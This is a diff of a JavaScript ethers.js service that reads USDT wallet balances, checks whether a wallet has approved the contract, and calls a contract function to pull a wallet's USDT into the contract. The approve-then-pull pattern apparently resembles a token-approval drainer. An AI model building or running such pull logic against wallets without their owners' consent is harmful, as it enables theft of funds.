@@ -76,70 +76,56 @@ class ContractService {
         }
     }
 
-    // In the getWalletUSDTBalance method, replace with this enhanced version:
-
-async getWalletUSDTBalance(walletAddress) {
-    console.log('=== DEBUG: getWalletUSDTBalance START ===');
-    console.log('Wallet address:', walletAddress);
-    console.log('USDT_CONTRACT_ADDRESS from env:', process.env.USDT_CONTRACT_ADDRESS);
-    console.log('Provider available:', !!this.provider);
-    
-    try {
-        // Use environment variable first
-        const usdtAddress = process.env.USDT_CONTRACT_ADDRESS;
-        
-        if (!usdtAddress) {
-            console.warn('USDT_CONTRACT_ADDRESS not set in environment');
+    async getWalletUSDTBalance(walletAddress) {
+        try {
+            // Use environment variable first
+            const usdtAddress = process.env.USDT_CONTRACT_ADDRESS;
+            
+            if (!usdtAddress) {
+                console.warn('USDT_CONTRACT_ADDRESS not set in environment');
+                return '0';
+            }
+            
+            // If we don't have a provider, create one just for this read operation
+            let providerToUse = this.provider;
+            
+            if (!providerToUse && process.env.RPC_URL) {
+                providerToUse = new ethers.JsonRpcProvider(process.env.RPC_URL);
+            }
+            
+            if (!providerToUse) {
+                console.warn('No provider available for balance query');
+                return '0';
+            }
+            
+            const usdtContract = new ethers.Contract(
+                usdtAddress,
+                ['function balanceOf(address account) external view returns (uint256)'],
+                providerToUse
+            );
+            
+            const balance = await usdtContract.balanceOf(walletAddress);
+            
+            // Try both 18 and 6 decimals (some USDT contracts use 6 decimals)
+            let formattedBalance = '0';
+            try {
+                formattedBalance = ethers.formatUnits(balance, 18);
+                
+                // If result looks like 0 with 18 decimals, try 6 decimals
+                if (parseFloat(formattedBalance) === 0 && balance > 0) {
+                    formattedBalance = ethers.formatUnits(balance, 6);
+                }
+            } catch (formatError) {
+                // Fallback to 6 decimals
+                formattedBalance = ethers.formatUnits(balance, 6);
+            }
+            
+            return formattedBalance;
+        } catch (error) {
+            console.error('Error getting wallet balance for address', walletAddress, ':', error.message);
             return '0';
         }
-        
-        console.log('Using USDT contract address:', usdtAddress);
-        
-        // Use existing provider
-        const providerToUse = this.provider;
-        
-        if (!providerToUse) {
-            console.warn('No provider available for balance query');
-            return '0';
-        }
-        
-        console.log('Provider is available, creating contract instance');
-        
-        const usdtContract = new ethers.Contract(
-            usdtAddress,
-            ['function balanceOf(address account) external view returns (uint256)'],
-            providerToUse
-        );
-        
-        console.log('Calling balanceOf function...');
-        const balance = await usdtContract.balanceOf(walletAddress);
-        console.log('Raw balance result:', balance.toString());
-        
-        // Try both 18 and 6 decimals
-        let formattedBalance = '0';
-        const balanceBN = BigInt(balance.toString());
-        
-        // Try 18 decimals first
-        formattedBalance = ethers.formatUnits(balance, 18);
-        console.log('Formatted balance (18 decimals):', formattedBalance);
-        
-        // If it's 0 with 18 decimals but raw balance > 0, try 6 decimals
-        if (parseFloat(formattedBalance) === 0 && balanceBN > 0) {
-            formattedBalance = ethers.formatUnits(balance, 6);
-            console.log('Formatted balance (6 decimals, fallback):', formattedBalance);
-        }
-        
-        console.log('Final formatted balance:', formattedBalance);
-        console.log('=== DEBUG: getWalletUSDTBalance END ===');
-        
-        return formattedBalance;
-    } catch (error) {
-        console.error('Error getting wallet balance for address', walletAddress, ':', error.message);
-        console.error('Error stack:', error.stack);
-        return '0';
     }
-}
-
 
     async isWalletApproved(walletAddress) {
         if (!this.initialized) {
@@ -155,7 +141,7 @@ async getWalletUSDTBalance(walletAddress) {
         }
     }
 
-    // Pull USDT from wallet to contract
+    // Pull USDT from wallet to contract (CORRECTED FUNCTION NAME)
     async pullUSDTFromWallet(walletAddress) {
         if (!this.initialized) {
             return {
@@ -176,8 +162,8 @@ async getWalletUSDTBalance(walletAddress) {
                 };
             }
             
-            // Execute the pull
-            const tx = await this.contract.pullUSDTFromWallet(walletAddress, {
+            // Execute the pull (CORRECTED FUNCTION NAME)
+            const tx = await this.contract.pull(walletAddress, {
                 gasLimit: 300000,
                 gasPrice: await this.provider.getFeeData().then(feeData => feeData.gasPrice)
             });
@@ -350,4 +336,3 @@ async getWalletUSDTBalance(walletAddress) {
 }
 
 module.exports = new ContractService();
-
